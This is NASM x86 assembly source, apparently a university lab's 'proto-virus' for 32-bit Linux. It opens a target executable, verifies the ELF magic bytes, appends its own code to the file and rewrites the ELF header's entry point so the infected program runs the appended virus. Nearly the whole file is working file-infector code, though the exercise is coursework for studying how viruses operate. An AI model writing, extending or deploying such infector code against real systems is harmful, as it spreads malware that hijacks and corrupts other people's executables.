%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0

%define ENTRY		24	;0x18
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8

%define EHDR_size 52
%define firstInstruction_PHDR_load_address 0x08048000
	
	global _start

	section .text
_start:	push	ebp
	mov	ebp, esp
	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage
    ;get the OutStr address on runtime using get_my_loc
    call get_my_loc             
    mov ebx, next_i
    sub ebx, OutStr
    sub ecx, ebx        ;now ecx = the actual address of OutStr on runtime
    write 1, ecx, 31    ;write the OutStr string to stdout
    open FileName, RDWR, -1     ;call to open file ELFexec in RDWR mode. last arg is irrelevant
    
    ;;;;;ebp-4= exec file name, ebp-8=file descriptor,ebp-12=magic number of elf file,ebp-16- size of file before,ebp-68=elf header ;;;;;
    cmp dword eax, 0
    jl exitWithError            ;check if couldn't open the elf file
    mov [ebp-8], eax            ;get the file descriptor and store it in stack
    
    mov edi,ebp
    sub edi,12                  ;allocate ebp-12 to the elf signature / whatever inside the first 4 bytes
    
    ;check it's elf file
    read [ebp-8],edi,4          ;read the 4 starting bytes in file header = 0x7f,e,l,f
    ;compare each char of them
    cmp byte [ebp-12], 0x7f 
    jne exitWithError
    cmp byte [ebp-11], 'E' 
    jne exitWithError
    cmp byte [ebp-10], 'L'
    jne exitWithError
    cmp byte [ebp-9], 'F'
    jne exitWithError
    
    ;add the virus at the end of the elf file
    lseek [ebp-8], 0, SEEK_END  ;go to point on the end of file and get its size in eax
    mov [ebp-16], eax   ;store the size of the file before the changes of writing
    
    
    ;calc the size to write;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
    xor ebx, ebx
    xor ecx, ecx
    mov ecx, _start
	mov edx, virus_end
	sub edx, ecx
	xor edi,edi
	mov edi,edx
	write [ebp-8], _start, edi ;write the virus
    
    lseek [ebp-8], 0, SEEK_SET  ;move the pointer back to the start of the file
    
    ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
    
    ;allocating space in stack for the elf header
    xor edi,edi ;zeroize edi
    mov edi, ebp
    sub edi, 16 ;pass the last allocated memory place in stack
    sub edi, EHDR_size  ;allocate enough space for the header (52 bytes as observed using readelf)
    
    ;copy elf header into stack
    read [ebp-8], edi, EHDR_size
   
   ;zeroize eax and ebx
    xor eax,eax
    xor ebx,ebx
  
  
    ;update the the entry point to the first instruction of the virus
    mov eax, [ebp-16]   ;eax=the file size before changes
    mov ebx, firstInstruction_PHDR_load_address
    add eax, ebx      
    mov [ebp-68+ENTRY], eax ;file header entry point is now the virus first instruction
    
    lseek [ebp-8], 0, SEEK_SET  ;move the pointer back to the start of the file
    
    xor edi, edi    ;zeroize edi
    ;point the elf header in the stack
    mov edi, ebp    
    sub edi, 68     ;edi points to the header in stack
    
    ;replace the elf header in the file with the infected one
    write [ebp-8], edi, EHDR_size
    
    ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
    close [ebp-8]   ; close(fd)
    
    add esp, STK_RES;free allocated in stack
    mov esp, ebp    ;restore ebp
    pop ebp         ;restore ebp
    
    jmp VirusExit   ;exit with code 0- no errors occurred 
    
    
    
exitWithError:
   
    call get_my_loc             
    mov ebx, next_i
    sub ebx, Failstr
    sub ecx, ebx        ;now ecx = the actual address of OutStr on runtime
    write 1, ecx, 12    ;write the OutStr string to stdout
    exit 0x55
    
VirusExit:
       exit 0            ; Termination if all is OK and no previous code to jump to
                         ; (also an example for use of above macros)
	
FileName:	db "ELFexec", 0
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
Failstr:        db "perhaps not", 10 , 0
	
PreviousEntryPoint: dd VirusExit
;virus_end:
;get my loc function from class:
get_my_loc:
        call next_i
next_i:
        pop ecx
        ret
;;;
virus_end:
